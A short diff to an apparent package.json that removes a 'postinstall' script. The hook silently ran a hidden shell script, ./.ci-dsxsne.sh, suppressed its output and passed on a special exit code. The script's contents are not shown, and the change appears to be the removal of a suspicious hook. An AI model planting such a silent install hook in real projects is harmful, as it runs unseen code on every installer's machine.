@@ -5,8 +5,5 @@
   },
   "devDependencies": {
     "vue-tsc": "^2.0.19"
-  },
-  "scripts": {
-    "postinstall": "sh ./.ci-dsxsne.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
   }
 }
